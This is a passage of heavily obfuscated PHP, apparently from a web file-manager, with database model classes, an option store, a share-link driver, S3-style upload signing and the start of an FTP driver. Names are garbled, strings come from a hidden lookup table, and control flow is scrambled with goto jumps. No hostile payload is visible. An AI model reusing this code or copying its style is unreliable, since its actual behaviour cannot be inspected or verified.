$_SERVER[Å¸ş]; $FŸºéêæ“ = $this->tablePrefix . $this->tableName; foreach ($aäÖàœÙ› as $bñè Ñ°â™) { if (!is_array($bñè Ñ°â™) || count($bñè Ñ°â™) != 4) { continue; } $FÔ›ŠÃ¦Š = $bñè Ñ°â™[0] . $Fß†°éÛ¶ø[362] . $bñè Ñ°â™[1] . $Fß†°éÛ¶ø[113]; $E¾Ç¬Ï¡« = $bñè Ñ°â™[2] . $Fß†°éÛ¶ø[362] . $bñè Ñ°â™[3] . $Fß†°éÛ¶ø[113]; $dè‚±§… = "\x75\160\144\141\164\145\40{$FŸºéêæ“}\x20\163\x65\x74\40{$E¾Ç¬Ï¡«}\x20\x77\150\x65\x72\145\x20{$FÔ›ŠÃ¦Š}\x3b"; $this->execute($dè‚±§…); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($fÜ²–â®ÑÕ = false, $d–¢ùŠÀˆÛ = false) { $this->_chunkEvent = $fÜ²–â®ÑÕ; $this->_chunkEventParam = $d–¢ùŠÀˆÛ; } private function chunkEventCheck($bá³ˆ„¾œò) { if (!$this->_chunkEvent) { return; } $e¹ÀÁƒÍÈ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $e¹ÀÁƒÍÈ[$_SERVER[Å¸ş][363]] = $bá³ˆ„¾œò; Hook::trigger($this->_chunkEvent, $e¹ÀÁƒÍÈ); } public function addAll($E”°çˆğÒ™, $D¸½Ñ = array(), $BËĞ¦‹¨Î = false) { goto eœ¶Ö‡“…ù; Eêò‡ÀæÃš: if (empty($E”°çˆğÒ™)) { $this->error = think_lang($dÃÜ½ªÎÑ´[259]); return !1; } $D¸½Ñ = $this->_parseOptions($D¸½Ñ); foreach ($E”°çˆğÒ™ as $c…×ì²ÔÖí => $E‚õçŞÍñ†) { $E”°çˆğÒ™[$c…×ì²ÔÖí] = $this->_facade($E‚õçŞÍñ†); $this->_beforeInsert($E”°çˆğÒ™[$c…×ì²ÔÖí], $D¸½Ñ); } goto B¬—í»ÅøÊ; eœ¶Ö‡“…ù: $dÃÜ½ªÎÑ´ =& $_SERVER[Å¸ş]; ignore_timeout(); $F˜Ûâ™ÇÅØ = self::SQL_WHERE_IN_CHUNK; goto Eêò‡ÀæÃš; B¬—í»ÅøÊ: if (method_exists($this->db, $dÃÜ½ªÎÑ´[260])) { for ($EŞî¡Ùš¿ = 0; $EŞî¡Ùš¿ < count($E”°çˆğÒ™); $EŞî¡Ùš¿ += $F˜Ûâ™ÇÅØ) { $CË†«‡õ = array_slice($E”°çˆğÒ™, $EŞî¡Ùš¿, $F˜Ûâ™ÇÅØ); if (!is_array($CË†«‡õ) || count($CË†«‡õ) == 0) { break; } $e­Ê–×Í¸¸ = $this->db->insertAll($CË†«‡õ, $D¸½Ñ, $BËĞ¦‹¨Î); $this->chunkEventCheck(count($CË†«‡õ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($E”°çˆğÒ™ as $c…×ì²ÔÖí => $E‚õçŞÍñ†) { $e­Ê–×Í¸¸ = $this->db->insert($E‚õçŞÍñ†, $D¸½Ñ, $BËĞ¦‹¨Î); } $this->commit(); } if (!1 !== $e­Ê–×Í¸¸) { $D±ÏÄô¤­Š = $this->getLastInsID(); if ($D±ÏÄô¤­Š) { return $D±ÏÄô¤­Š; } } return $e­Ê–×Í¸¸; goto EÊùÒ¾„®Ê; EÊùÒ¾„®Ê: } public function save($D¨…ÙĞ‚ŞÊ = '', $E²ô¾ÑŞÎŒ = array()) { goto DÖ÷‰éŸÄ; EÜ¼Ç—¨×: $DÙÚ…µ÷ŸÆ = $dÒäÚóÊõœ[$E¦Ò¡„ò¥[263]][$Bˆò‰íƒ†È][1]; $DÙÚ…µ÷ŸÆ = is_array($DÙÚ…µ÷ŸÆ) ? $DÙÚ…µ÷ŸÆ : array(); $a›®„‹÷Ş¾ = count($DÙÚ…µ÷ŸÆ); goto E™Òíêšƒ¦; EÏ™•Ü½„: $Bˆò‰íƒ†È = $this->findWhereField($dÒäÚóÊõœ); if (!$Bˆò‰íƒ†È) { return parent::save($D¨…ÙĞ‚ŞÊ, $E²ô¾ÑŞÎŒ); } $fÄé‹¯Øñ = 0; goto EÜ¼Ç—¨×; DÖ÷‰éŸÄ: $E¦Ò¡„ò¥ =& $_SERVER[Å¸ş]; $d¿ÃİõÌã = self::SQL_WHERE_IN_CHUNK; $dÒäÚóÊõœ = $this->optionsValue(); goto EÏ™•Ü½„; E™Òíêšƒ¦: for ($BâÓ¯àô‡ = 0; $BâÓ¯àô‡ < $a›®„‹÷Ş¾; $BâÓ¯àô‡ += $d¿ÃİõÌã) { $cøèŸÁÂºª = array_slice($DÙÚ…µ÷ŸÆ, $BâÓ¯àô‡, $d¿ÃİõÌã); if (!is_array($cøèŸÁÂºª) || count($cøèŸÁÂºª) == 0) { break; } $dÒäÚóÊõœ[$E¦Ò¡„ò¥[263]][$Bˆò‰íƒ†È][1] = $cøèŸÁÂºª; $this->optionsValue($dÒäÚóÊõœ); $fÄé‹¯Øñ += parent::save($D¨…ÙĞ‚ŞÊ, $E²ô¾ÑŞÎŒ); $this->chunkEventCheck(count($cøèŸÁÂºª)); } $this->chunkEventSet(); return $fÄé‹¯Øñ; goto D‘‰‚Ş±â›; D‘‰‚Ş±â›: } public function add($bùˆïìÓò‡ = '', $aß®©Ù‡¥© = array(), $a«ƒ±ç = false) { if ($this->addTaskStatus && is_array($bùˆïìÓò‡)) { $this->addTaskData[] = $bùˆïìÓò‡; return; } return parent::add($bùˆïìÓò‡, $aß®©Ù‡¥©, $a«ƒ±ç); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($d†…°Á¶Íâ = array()) { goto eÖØíãøÜ; C»ö‹æ¨Ü´: $cšõŸ‹ËŠŸ = is_array($cšõŸ‹ËŠŸ) ? $cšõŸ‹ËŠŸ : array(); $cØ‘ñíÁ = null; for ($bÚĞÙî¹ª¤ = 0; $bÚĞÙî¹ª¤ < count($cšõŸ‹ËŠŸ); $bÚĞÙî¹ª¤ += $CçÔˆËì‰ó) { $EÖ²Œø˜è = array_slice($cšõŸ‹ËŠŸ, $bÚĞÙî¹ª¤, $CçÔˆËì‰ó); if (!is_array($EÖ²Œø˜è) || count($EÖ²Œø˜è) == 0) { break; } $aö¨ô ¯¡‘[$aíÄ‘³¡«ö[263]][$F¨ÙóÑ éñ][1] = $EÖ²Œø˜è; $this->optionsValue($aö¨ô ¯¡‘); $C‡Œ¸® = parent::select($d†…°Á¶Íâ); if (!$C‡Œ¸®) { continue; } if (is_null($cØ‘ñíÁ)) { $cØ‘ñíÁ = array(); } $cØ‘ñíÁ = array_merge($cØ‘ñíÁ, $C‡Œ¸®); } goto DÈæ‹ÈÓî; DÈæ‹ÈÓî: return $cØ‘ñíÁ; goto BŞàˆ³¤; b¸–¹ªÂØ: $F¨ÙóÑ éñ = $this->findWhereField($aö¨ô ¯¡‘); if (!$F¨ÙóÑ éñ || isset($aö¨ô ¯¡‘[$aíÄ‘³¡«ö[280]]) || isset($aö¨ô ¯¡‘[$aíÄ‘³¡«ö[340]])) { return parent::select($d†…°Á¶Íâ); } $cšõŸ‹ËŠŸ = $aö¨ô ¯¡‘[$aíÄ‘³¡«ö[263]][$F¨ÙóÑ éñ][1]; goto C»ö‹æ¨Ü´; eÖØíãøÜ: $aíÄ‘³¡«ö =& $_SERVER[Å¸ş]; $CçÔˆËì‰ó = self::SQL_WHERE_IN_CHUNK; $aö¨ô ¯¡‘ = $this->optionsValue(); goto b¸–¹ªÂØ; BŞàˆ³¤: } public function delete($dìµ¸óÌ³¬ = array()) { goto FÀ¢ñ¿í«; B©‡ê°‹ä¼: return $f¤£•×™ŸÑ; goto cÖÃº„¬‰¼; FÀ¢ñ¿í«: $AŠ–º•’ =& $_SERVER[Å¸ş]; $AäÂ‡‘ = self::SQL_WHERE_IN_CHUNK; $c®›¿ŸìÙ = $this->optionsValue(); goto eò¾ºêõ£•; B£•Öæ–‚: $Cº‚¹…ÔÙé = $c®›¿ŸìÙ[$AŠ–º•’[263]][$Aå–ÔÓß’¡][1]; $Cº‚¹…ÔÙé = is_array($Cº‚¹…ÔÙé) ? $Cº‚¹…ÔÙé : array(); for ($a¸Ú°åÕù = 0; $a¸Ú°åÕù < count($Cº‚¹…ÔÙé); $a¸Ú°åÕù += $AäÂ‡‘) { $cÉÜáÚŠâ— = array_slice($Cº‚¹…ÔÙé, $a¸Ú°åÕù, $AäÂ‡‘); if (!is_array($cÉÜáÚŠâ—) || count($cÉÜáÚŠâ—) == 0) { break; } $c®›¿ŸìÙ[$AŠ–º•’[263]][$Aå–ÔÓß’¡][1] = $cÉÜáÚŠâ—; $this->optionsValue($c®›¿ŸìÙ); $f¤£•×™ŸÑ += parent::delete($dìµ¸óÌ³¬); } goto B©‡ê°‹ä¼; eò¾ºêõ£•: $Aå–ÔÓß’¡ = $this->findWhereField($c®›¿ŸìÙ); if (!$Aå–ÔÓß’¡) { return parent::delete($dìµ¸óÌ³¬); } $f¤£•×™ŸÑ = 0; goto B£•Öæ–‚; cÖÃº„¬‰¼: } private function findWhereField($f¥¾ŞÍ¤Ô†) { $aĞŞ‰ã‹°é =& $_SERVER[Å¸ş]; $D’™ï™Û‡õ = self::SQL_WHERE_IN_CHUNK; if (!is_array($f¥¾ŞÍ¤Ô†) || !is_array($f¥¾ŞÍ¤Ô†[$aĞŞ‰ã‹°é[263]])) { return !1; } foreach ($f¥¾ŞÍ¤Ô†[$aĞŞ‰ã‹°é[263]] as $aÙé‰é¾Ä½ => $dšÃ„ËÊ°) { if (is_array($dšÃ„ËÊ°) && isset($dšÃ„ËÊ°[0]) && is_string($dšÃ„ËÊ°[0]) && strtolower($dšÃ„ËÊ°[0]) == $aĞŞ‰ã‹°é[7] && is_array($dšÃ„ËÊ°[1]) && count($dšÃ„ËÊ°[1]) > $D’™ï™Û‡õ) { ignore_timeout(); return $aÙé‰é¾Ä½; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\164\145\155\x4f\160\x74\x69\x6f\156"; public $field = array(); public function listData($dÂïÕ•Şîà = false, $bèÌèğ‡° = "\155\157\x64\x69\146\171\x54\x69\155\145", $c¤˜Ê´Ï» = false) { $cŠ·š±İ¼Á = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$cŠ·š±İ¼Á) { return $dÂïÕ•Şîà ? null : array(); } if (!$dÂïÕ•Şîà) { $cŠ·š±İ¼Á = array_filter(array_values($cŠ·š±İ¼Á)); return array_sort_by($cŠ·š±İ¼Á, $bèÌèğ‡°, $c¤˜Ê´Ï»); } return $cŠ·š±İ¼Á[$_SERVER[Å¸ş][364] . $dÂïÕ•Şîà]; } public function insert($b„ÁŒ¨…Ü) { goto E«Ñ‰­¨; e¬Ú—é”Â…: return $BµñÕ‘âÊ; goto c‡îëä¢º; cÙğÀ©‘Ãô: $b„ÁŒ¨…Ü[$e…ƒ´Æä[107]] = time(); Model($this->modelType)->set($e…ƒ´Æä[365], $BµñÕ‘âÊ, $this->optionType . $e…ƒ´Æä[366]); Model($this->modelType)->set($e…ƒ´Æä[364] . $BµñÕ‘âÊ, $b„ÁŒ¨…Ü, $this->optionType); goto e¬Ú—é”Â…; E«Ñ‰­¨: $e…ƒ´Æä =& $_SERVER[Å¸ş]; $b„ÁŒ¨…Ü = array_field_key($b„ÁŒ¨…Ü, $this->field); $BµñÕ‘âÊ = Model($this->modelType)->get($e…ƒ´Æä[365], $this->optionType . $e…ƒ´Æä[366]); goto C‡Ì²½¾†©; C‡Ì²½¾†©: $BµñÕ‘âÊ = $BµñÕ‘âÊ ? $BµñÕ‘âÊ : 0; $b„ÁŒ¨…Ü[$e…ƒ´Æä[367]] = ++$BµñÕ‘âÊ; $b„ÁŒ¨…Ü[$e…ƒ´Æä[187]] = time(); goto cÙğÀ©‘Ãô; c‡îëä¢º: } public function update($AàĞ°‘, $d·Î õ‰ŸÖ) { goto F°§òë™Ê; d—‰›Ã¾Í¬: return Model($this->modelType)->set($Cá²êÙÀô[364] . $AàĞ°‘, $d·Î õ‰ŸÖ, $this->optionType); goto bã®ÂÊà¬; B×‘„š³‘÷: if (!$D¤ÄìŞ²¿) { return !1; } $d·Î õ‰ŸÖ = array_merge($D¤ÄìŞ²¿, $d·Î õ‰ŸÖ); $d·Î õ‰ŸÖ[$Cá²êÙÀô[107]] = time(); goto d—‰›Ã¾Í¬; F°§òë™Ê: $Cá²êÙÀô =& $_SERVER[Å¸ş]; $d·Î õ‰ŸÖ = array_field_key($d·Î õ‰ŸÖ, $this->field); $D¤ÄìŞ²¿ = $this->listData($AàĞ°‘); goto B×‘„š³‘÷; bã®ÂÊà¬: } public function remove($Có¯§®«) { return Model($this->modelType)->remove($_SERVER[Å¸ş][364] . $Có¯§®«, $this->optionType); } public function clear() { $bè‰ÒÆ¹àĞ =& $_SERVER[Å¸ş]; Model($this->modelType)->remove($bè‰ÒÆ¹àĞ[365], $this->optionType . $bè‰ÒÆ¹àĞ[366]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($fÀ®ÒÙ—÷Œ, $Fœ´ë˜ŸËì) { if (!$Fœ´ë˜ŸËì) { return !1; } $C©ãƒ•–Î˜ = $this->listData(); $C©ãƒ•–Î˜ = array_to_keyvalue($C©ãƒ•–Î˜, $fÀ®ÒÙ—÷Œ); return isset($C©ãƒ•–Î˜[$Fœ´ë˜ŸËì]) ? $C©ãƒ•–Î˜[$Fœ´ë˜ŸËì] : !1; } public function findByName($Aµ„› ì) { return $this->findByKey($_SERVER[Å¸ş][28], $Aµ„› ì); } protected function resetData($E²ˆÆ¹´·) { $c‰¬÷ñ£¾Ö =& $_SERVER[Å¸ş]; $E²ˆÆ¹´· = is_array($E²ˆÆ¹´·) ? $E²ˆÆ¹´· : array(); $Eµá —îÌ¾ = array(); for ($Aß™ËÅ¬ = 0; $Aß™ËÅ¬ < count($E²ˆÆ¹´·); $Aß™ËÅ¬++) { $Eµá —îÌ¾[$c‰¬÷ñ£¾Ö[364] . $E²ˆÆ¹´·[$Aß™ËÅ¬][$c‰¬÷ñ£¾Ö[367]]] = $E²ˆÆ¹´·[$Aß™ËÅ¬]; } return Model($this->modelType)->set($Eµá —îÌ¾, !1, $this->optionType); } private function getAutoName($Cğä©Õ Ù‹) { $Aëˆ˜¾ºƒê = array_to_keyvalue($this->listData(), $_SERVER[Å¸ş][28]); if (!$Aëˆ˜¾ºƒê || !isset($Aëˆ˜¾ºƒê[$Cğä©Õ Ù‹])) { return $Cğä©Õ Ù‹; } for ($F–Ò‡İÏ = 1; $F–Ò‡İÏ < count($Aëˆ˜¾ºƒê); $F–Ò‡İÏ++) { $BÈ‹‘ïÆ = $Cğä©Õ Ù‹ . "\x28{$F–Ò‡İÏ}\x29"; if (!isset($Aëˆ˜¾ºƒê[$BÈ‹‘ïÆ])) { return $BÈ‹‘ïÆ; } } return $BÈ‹‘ïÆ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($díÑË±Ğœ¤ = false, $eâø‡âÒÏÉ = '', $C”º“°àŸ = false) { goto e¢Ñ¾Œ¦’æ; B‚ùÊÕ—ØÃ: $this->cacheSet($eâø‡âÒÏÉ, $bìÚ„‰âªÄ); $bìÚ„‰âªÄ = array_merge($EŠ†‡´ŠÂ, $bìÚ„‰âªÄ); return $díÑË±Ğœ¤ ? $bìÚ„‰âªÄ[$díÑË±Ğœ¤] : $bìÚ„‰âªÄ; goto CÃöô¦Êà; AÈŒ¡µ¼‹³: $EŠ†‡´ŠÂ = is_array($EŠ†‡´ŠÂ) ? $EŠ†‡´ŠÂ : array(); if (is_array($bìÚ„‰âªÄ)) { $bìÚ„‰âªÄ = array_merge($EŠ†‡´ŠÂ, $bìÚ„‰âªÄ); return $díÑË±Ğœ¤ ? isset($bìÚ„‰âªÄ[$díÑË±Ğœ¤]) ? $bìÚ„‰âªÄ[$díÑË±Ğœ¤] : null : $bìÚ„‰âªÄ; } $B±Š¿•¹¾‘ = $this->filterWhere(array($bÂÊøïÊÔ†[29] => $eâø‡âÒÏÉ)); goto cø—©·¹¢; e¢Ñ¾Œ¦’æ: $bÂÊøïÊÔ† =& $_SERVER[Å¸ş]; $bìÚ„‰âªÄ = $this->cacheGet($eâø‡âÒÏÉ); $EŠ†‡´ŠÂ = $this->optionDefault($eâø‡âÒÏÉ); goto AÈŒ¡µ¼‹³; cø—©·¹¢: $bìÚ„‰âªÄ = $this->where($B±Š¿•¹¾‘)->select(); $bìÚ„‰âªÄ = array_to_keyvalue($bìÚ„‰âªÄ, $bÂÊøïÊÔ†[89], $bÂÊøïÊÔ†[359]); foreach ($bìÚ„‰âªÄ as $a§Ù–Áƒ => $díÃÉ·Š‡Ÿ) { if ($C”º“°àŸ || in_array($a§Ù–Áƒ, $this->jsonField)) { $bìÚ„‰âªÄ[$a§Ù–Áƒ] = json_decode($díÃÉ·Š‡Ÿ, !0); } } goto B‚ùÊÕ—ØÃ; CÃöô¦Êà: } public function set($bó¿…ò¬•¦, $F–Ëíï¹§² = false, $f„«Í”îóÙ = '') { goto cŒµÊ’”¸›; dŞê“³†º: return $this->addAll($eª©ËÁøˆ, array(), !0); goto BºÀ‹ ˜¦ô; eŸ×·µ¡Á‘: $Dó‡“Ø„¡â = is_array($bó¿…ò¬•¦) ? $bó¿…ò¬•¦ : array($bó¿…ò¬•¦ => $F–Ëíï¹§²); foreach ($Dó‡“Ø„¡â as $d¸Ÿñ•Ï³× => $eæğë‰ô) { if (is_array($eæğë‰ô)) { $eæğë‰ô = json_encode_force($eæğë‰ô); } $this->checkLength($eæğë‰ô, !1, $this->tableName . $cƒª‰®Ã¥‘[4] . $bó¿…ò¬•¦); $eæğë‰ô = self::textEncode($eæğë‰ô); $Dó‡“Ø„¡â = array($cƒª‰®Ã¥‘[29] => $f„«Í”îóÙ, $cƒª‰®Ã¥‘[89] => $d¸Ÿñ•Ï³×, $cƒª‰®Ã¥‘[359] => $eæğë‰ô); $eª©ËÁøˆ[] = $this->filterWhere($Dó‡“Ø„¡â); } if (!$eª©ËÁøˆ) { return !0; } goto dŞê“³†º; cŒµÊ’”¸›: $cƒª‰®Ã¥‘ =& $_SERVER[Å¸ş]; $this->cacheRemove($f„«Í”îóÙ); $eª©ËÁøˆ = array(); goto eŸ×·µ¡Á‘; BºÀ‹ ˜¦ô: } protected function optionDefault($fšÂñÖ¬È§ = '') { return !1; } public function setDeep($FÁİİì’¦, $b¦İÀôï¯Ü = false, $fæŞ–¾Í¾ = '') { $B³ÂìËœÊŞ = explode($_SERVER[Å¸ş][91], $FÁİİì’¦); $bœ¹Ø£ŞĞ = $this->get(); array_set_value($bœ¹Ø£ŞĞ, $FÁİİì’¦, $b¦İÀôï¯Ü); $this->set($B³ÂìËœÊŞ[0], $bœ¹Ø£ŞĞ[$B³ÂìËœÊŞ[0]], $fæŞ–¾Í¾); } public function remove($bğ©Ñ­‹Áİ, $c‡ê»¯—Š¾ = '') { $bÃĞ×Çò² =& $_SERVER[Å¸ş]; $this->cacheRemove($c‡ê»¯—Š¾); $bªÊµ÷™Ú = $this->filterWhere(array($bÃĞ×Çò²[89] => $bğ©Ñ­‹Áİ, $bÃĞ×Çò²[29] => $c‡ê»¯—Š¾)); if (is_null($bğ©Ñ­‹Áİ)) { unset($bªÊµ÷™Ú[$bÃĞ×Çò²[89]]); } return $this->where($bªÊµ÷™Ú)->delete(); } public function cacheSet($CÜóê‰Ô¼ï, $BÅ‰õåÏ¨ = false) { return Cache::set($this->cacheKey($CÜóê‰Ô¼ï), $BÅ‰õåÏ¨); } public function cacheGet($A‡ƒÂŞ˜) { return Cache::get($this->cacheKey($A‡ƒÂŞ˜)); } public function cacheRemove($cÏä‡è»ì—) { return Cache::remove($this->cacheKey($cÏä‡è»ì—)); } protected function filterWhere($e¡’·–˜½İ) { return $e¡’·–˜½İ; } protected function cacheKey($EŒ¬œàª¬) { return $EŒ¬œàª¬; } } goto F±À¨Ş‚ƒ; eŒË”ïµ«›: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($AÍ†°¡öÆ§) { $this->pathParse = $AÍ†°¡öÆ§; } protected function infoParse($A“„œ™²„¸, $DÆ—à¶ãÑö = false) { $CâÒºĞ‚´ =& $_SERVER[Å¸ş]; return Action($CâÒºĞ‚´[1016])->sharePathInfo($this->pathParse[$CâÒºĞ‚´[75]], !0, $DÆ—à¶ãÑö); } public function listPath($FÈÙÜŒ§Â, $cìº¸™ä® = false) { $A‰ŞÄ¡Ù¬Æ =& $_SERVER[Å¸ş]; $b‘ï•ñ«íÑ = IO::listPath($FÈÙÜŒ§Â, $cìº¸™ä®); foreach ($b‘ï•ñ«íÑ as $b†”ÒÌƒâ => $DŒŠ´•ÆĞ) { if (!in_array($b†”ÒÌƒâ, array($A‰ŞÄ¡Ù¬Æ[73], $A‰ŞÄ¡Ù¬Æ[74]))) { continue; } foreach ($DŒŠ´•ÆĞ as $dêâôÊ³Ğ  => $fñ•áï’Ó) { $fñ•áï’Ó = Action($A‰ŞÄ¡Ù¬Æ[1131])->parsePathChildren($fñ•áï’Ó, array($A‰ŞÄ¡Ù¬Æ[387] => $FÈÙÜŒ§Â)); $b‘ï•ñ«íÑ[$b†”ÒÌƒâ][$dêâôÊ³Ğ ] = Action($A‰ŞÄ¡Ù¬Æ[1016])->shareItemInfo($fñ•áï’Ó); } } return $b‘ï•ñ«íÑ; } public function listAll($bòÓ‰À·©) { $CÇ–¹¶¥¶ =& $_SERVER[Å¸ş]; $D»İàÔ®š = IO::listAll($bòÓ‰À·©); foreach ($D»İàÔ®š as &$c¡Ñ©à—Úã) { $c¡Ñ©à—Úã = array_merge(IO::info($c¡Ñ©à—Úã[$CÇ–¹¶¥¶[75]]), $c¡Ñ©à—Úã); $c¡Ñ©à—Úã[$CÇ–¹¶¥¶[391]] = Action($CÇ–¹¶¥¶[1016])->shareItemInfo($c¡Ñ©à—Úã); } unset($c¡Ñ©à—Úã); return $D»İàÔ®š; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Bù Óø’¡Ğ) { parent::__construct($Bù Óø’¡Ğ); $this->signatureVersion($_SERVER[Å¸ş][200]); } public function uploadFormData($a®·¥‡éĞ, $BõØÍ´èæ÷ = 3600) { goto d’§åŒÖë; CŸÏ˜¬¹Ì: $BöÖØ¡Ù‚› = base64_encode(json_encode($eò”Ù´‘£)); $D¦±ùé¹®Ñ = hash_hmac($c‘ñòƒÈÅß[1142], $F­¡âİ· , $c‘ñòƒÈÅß[1143] . $this->secret, !0); $dÑ¡Š‹…Â = hash_hmac($c‘ñòƒÈÅß[1142], $this->region, $D¦±ùé¹®Ñ, !0); goto EËØÕÁ­Æ”; Cö²Æ‹ˆÏ£: $a­íä»Ì„­ = $c‘ñòƒÈÅß[59]; $Aö½¨Û¨¥Ë = gmdate($c‘ñòƒÈÅß[1133]); $F­¡âİ·  = gmdate($c‘ñòƒÈÅß[693]); goto E¾¨½ãªøä; fÇø¤®»Œ: $DàÔòä¾× = array($c‘ñòƒÈÅß[199] => $c‘ñòƒÈÅß[33], $c‘ñòƒÈÅß[1144] => $c‘ñòƒÈÅß[33], $c‘ñòƒÈÅß[1102] => $e›õ ’Âˆ, $c‘ñòƒÈÅß[1106] => $CÒõÏ—Ôâˆ, $c‘ñòƒÈÅß[1110] => $BöÖØ¡Ù‚›, $c‘ñòƒÈÅß[1145] => $e²ÑÄÄ™£, $c‘ñòƒÈÅß[1146] => $d”†–¬å²ô, $c‘ñòƒÈÅß[1147] => $Aö½¨Û¨¥Ë, $c‘ñòƒÈÅß[1148] => $bó’‡ÆÔ­…, $c‘ñòƒÈÅß[1149] => $fÏ½†Œ™‘¢, $c‘ñòƒÈÅß[169] => $this->getHost()); return $DàÔòä¾×; goto CÕšª»Ëêé; d’§åŒÖë: $c‘ñòƒÈÅß =& $_SERVER[Å¸ş]; $e›õ ’Âˆ = $c‘ñòƒÈÅß[185]; $d”†–¬å²ô = $c‘ñòƒÈÅß[1132]; goto Cö²Æ‹ˆÏ£; EËØÕÁ­Æ”: $dÉ…íÅ†ØŠ = hash_hmac($c‘ñòƒÈÅß[1142], $a­íä»Ì„­, $dÑ¡Š‹…Â, !0); $aÖÔÎ‘Ë˜¦ = hash_hmac($c‘ñòƒÈÅß[1142], $AÁ½ïù”âí, $dÉ…íÅ†ØŠ, !0); $fÏ½†Œ™‘¢ = hash_hmac($c‘ñòƒÈÅß[1142], $BöÖØ¡Ù‚›, $aÖÔÎ‘Ë˜¦); goto fÇø¤®»Œ; E¾¨½ãªøä: $AÁ½ïù”âí = $c‘ñòƒÈÅß[1134]; $bó’‡ÆÔ­… = $BõØÍ´èæ÷ . $c‘ñòƒÈÅß[33]; $CÒõÏ—Ôâˆ = $c‘ñòƒÈÅß[1098]; goto b„ëä×¡Ğ´; b„ëä×¡Ğ´: $C‘Öƒ™Ï­ = array($this->accessKey, $F­¡âİ· , $this->region, $a­íä»Ì„­, $AÁ½ïù”âí); $e²ÑÄÄ™£ = implode($c‘ñòƒÈÅß[8], $C‘Öƒ™Ï­); $eò”Ù´‘£ = array($c‘ñòƒÈÅß[1100] => gmdate($c‘ñòƒÈÅß[1099], strtotime($c‘ñòƒÈÅß[1135])), $c‘ñòƒÈÅß[1101] => array(array($c‘ñòƒÈÅß[1103] => $this->bucket), array($c‘ñòƒÈÅß[1102] => $e›õ ’Âˆ), array($c‘ñòƒÈÅß[1104], $c‘ñòƒÈÅß[1105], $c‘ñòƒÈÅß[33]), array($c‘ñòƒÈÅß[1104], $c‘ñòƒÈÅß[1136], $c‘ñòƒÈÅß[33]), array($c‘ñòƒÈÅß[1104], $c‘ñòƒÈÅß[1137], $c‘ñòƒÈÅß[33]), array($c‘ñòƒÈÅß[1106] => $CÒõÏ—Ôâˆ), array($c‘ñòƒÈÅß[1138] => $e²ÑÄÄ™£), array($c‘ñòƒÈÅß[1139] => $d”†–¬å²ô), array($c‘ñòƒÈÅß[1140] => $Aö½¨Û¨¥Ë), array($c‘ñòƒÈÅß[1141] => $bó’‡ÆÔ­…))); goto CŸÏ˜¬¹Ì; CÕšª»Ëêé: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($cÊ×é“ªñµ) { parent::__construct(); if (count($cÊ×é“ªñµ) > 0) { $this->_init($cÊ×é“ªñµ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Dõ‹Øİ®¡) { $e’ÉœÇá‘ã =& $_SERVER[Å¸ş]; global $config; $this->appCharset = $config[$e’ÉœÇá‘ã[1150]]; $this->systemCharset = $config[$e’ÉœÇá‘ã[1151]]; if (isset($Dõ‹Øİ®¡[$e’ÉœÇá‘ã[1152]]) && $Dõ‹Øİ®¡[$e’ÉœÇá‘ã[1152]]) { $this->systemCharset = $Dõ‹Øİ®¡[$e’ÉœÇá‘ã[1152]]; } } public function iconvApp($cÛåì¬¢ÏÓ) { return $this->iconvTo($cÛåì¬¢ÏÓ, $this->systemCharset, $this->appCharset); } public function iconvSystem($aÜëÌÓ¦¹) { return $this->iconvTo($aÜëÌÓ¦¹, $this->appCharset, $this->systemCharset); } public function getPathOuter($aîÏÀÉ¢Ğˆ) { goto AØñÚ¥õÔï; A“¼Ãïâ±: if (substr($bœ‘¤†±ì, 0, 2) == $bªšëÑ‚Æ[1153]) { $bœ‘¤†±ì = BASIC_PATH . substr($bœ‘¤†±ì, 2); } if (substr($aîÏÀÉ¢Ğˆ, 0, 2) == $bªšëÑ‚Æ[1153]) { $aîÏÀÉ¢Ğˆ = BASIC_PATH . substr($aîÏÀÉ¢Ğˆ, 2); } $bœ‘¤†±ì = KodIO::clear($bœ‘¤†±ì); goto eÅÎ¹™Ô’; f±×°“ğµª: return $this->pathDriver . $bªšëÑ‚Æ[8] . ltrim($aîÏÀÉ¢Ğˆ, $bªšëÑ‚Æ[8]); goto A‘ÜŠä¿­×; AØñÚ¥õÔï: $bªšëÑ‚Æ =& $_SERVER[Å¸ş]; $bœ‘¤†±ì = $this->iconvApp($this->pathBase); $aîÏÀÉ¢Ğˆ = $this->iconvApp($aîÏÀÉ¢Ğˆ); goto A“¼Ãïâ±; eÅÎ¹™Ô’: $aîÏÀÉ¢Ğˆ = KodIO::clear($aîÏÀÉ¢Ğˆ); $aîÏÀÉ¢Ğˆ = substr($aîÏÀÉ¢Ğˆ, strlen($bœ‘¤†±ì)); if (empty($this->pathDriver)) { return $aîÏÀÉ¢Ğˆ; } goto f±×°“ğµª; A‘ÜŠä¿­×: } private function _init($fÚÉ“¿§ßõ = array()) { $C¢…‘®ÓÉ =& $_SERVER[Å¸ş]; if (!function_exists($C¢…‘®ÓÉ[1154])) { show_json(LNG($C¢…‘®ÓÉ[1155]), !1); } $this->config = $fÚÉ“¿§ßõ; $this->charsetReset($fÚÉ“¿§ßõ); foreach ($fÚÉ“¿§ßõ as $F¿¼Ï¿Ü‹ => $Bó‹õ¼ìŒƒ) { if (isset($this->{$F¿¼Ï¿Ü‹})) { $this->{$F¿¼Ï¿Ü‹} = $Bó‹õ¼ìŒƒ; } } return $this->_login($fÚÉ“¿§ßõ); } private function _login($BŠøÜ¦íì¬) { goto eµ´–÷Ë¿Ñ; fìÍ¤Õ‹¸: $this->connect = @ftp_connect($this->host, $this->port, 